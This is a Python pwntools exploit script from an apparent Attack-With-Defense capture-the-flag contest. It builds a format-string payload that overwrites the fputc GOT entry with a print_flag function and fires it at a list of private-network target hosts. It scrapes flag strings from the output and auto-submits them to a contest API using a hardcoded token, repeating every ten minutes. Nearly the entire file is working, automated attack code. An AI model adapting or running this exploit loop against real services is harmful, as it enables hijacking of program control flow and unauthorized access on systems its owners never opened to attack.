from pwn import *
import argparse
import time
import json
import urllib.request
import urllib.error
import logging
import sys
import re


DEFAULT_TARGETS = [
    "172.29.43.42",
    "172.29.43.43",
    "172.29.43.44",
    "172.29.43.45",
]

DEFAULT_PORT = 1000

FLAG_API_URL = "http://10.2.60.1/api/ct/web/awd_race/race/26c4e794b2f1612181e55422e8ddc718/flag/robot/"
TOKEN = "67b0d49867ee5e16595959bac3fd1520"


def submit_flag(flag: str) -> bool:
    payload = json.dumps({"flag": flag, "token": TOKEN}).encode()
    req = urllib.request.Request(FLAG_API_URL, data=payload, headers={"Content-Type": "application/json"}, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read().decode(errors="replace")
            try:
                j = json.loads(body)
                logging.info("Submit response: %s", j)
            except Exception:
                logging.info("Submit response (non-JSON): %s", body)
            return True
    except urllib.error.HTTPError as e:
        logging.error("HTTPError while submitting flag: %s", e.read().decode(errors="replace"))
    except Exception as e:
        logging.exception("Error submitting flag: %s", e)
    return False


def make_payload(binary_path):
    elf = ELF(binary_path)
    context.binary = elf
    context.arch = "amd64"
    fputc_got = elf.got["fputc"]
    print_flag = elf.symbols["print_flag"]
    payload = fmtstr_payload(
        5,
        {fputc_got: print_flag},
        write_size="short",
        write_size_max="short",
        strategy="small",
    )
    return payload


def exploit_target(binary, host, port, payload):
    io = None
    try:
        if host and host not in ("127.0.0.1", "localhost"):
            io = remote(host, port)
        else:
            io = process(binary)

        io.sendlineafter(b"choice>", b"7")
        io.sendafter(b"incident>", payload + b"\n")

        data = b""
        end = time.time() + 5
        while time.time() < end:
            try:
                chunk = io.recv(timeout=1)
                if not chunk:
                    time.sleep(0.1)
                    continue
                data += chunk
            except EOFError:
                break
            except Exception:
                time.sleep(0.1)

            m = re.search(rb"flag\{[^}]+\}", data)
            if m:
                return m.group(0).decode(errors="replace")

        # final attempt
        try:
            data += io.recv(timeout=1)
        except Exception:
            pass
        m = re.search(rb"flag\{[^}]+\}", data)
        if m:
            return m.group(0).decode(errors="replace")
        return None
    finally:
        if io:
            try:
                io.close()
            except Exception:
                pass


def main():
    parser = argparse.ArgumentParser(description="Manifest format-string solve and auto-submit")
    parser.add_argument("--remote", action="store_true", help="use single remote host/port")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--binary", default="manifest/chall/awd")
    parser.add_argument("--targets", help="Comma-separated list of target IPs (overrides defaults)")
    parser.add_argument("--once", action="store_true", help="Run once and exit")
    args = parser.parse_args()

    logging.basicConfig(level=logging.INFO, format="[%(asctime)s] %(message)s")

    if args.targets:
        targets = [t.strip() for t in args.targets.split(",") if t.strip()]
    elif args.remote:
        targets = [args.host]
    else:
        targets = DEFAULT_TARGETS

    if args.port is None:
        logging.error("--port is required for remote targets")
        sys.exit(1)

    payload = make_payload(args.binary)

    try:
        while True:
            for host in targets:
                try:
                    logging.info("Exploiting %s:%s", host, args.port)
                    flag = exploit_target(args.binary, host, args.port, payload)
                    if not flag:
                        logging.warning("No flag recovered from %s", host)
                        continue
                    logging.info("Recovered flag from %s: %s", host, flag)
                    submit_flag(flag)
                    time.sleep(0.2)
                except KeyboardInterrupt:
                    raise
                except Exception as e:
                    logging.exception("Error while exploiting %s: %s", host, e)

            if args.once:
                break
            logging.info("Sleeping 10 minutes before next run")
            time.sleep(600)
    except KeyboardInterrupt:
        logging.info("Interrupted by user, exiting")


if __name__ == "__main__":
    main()
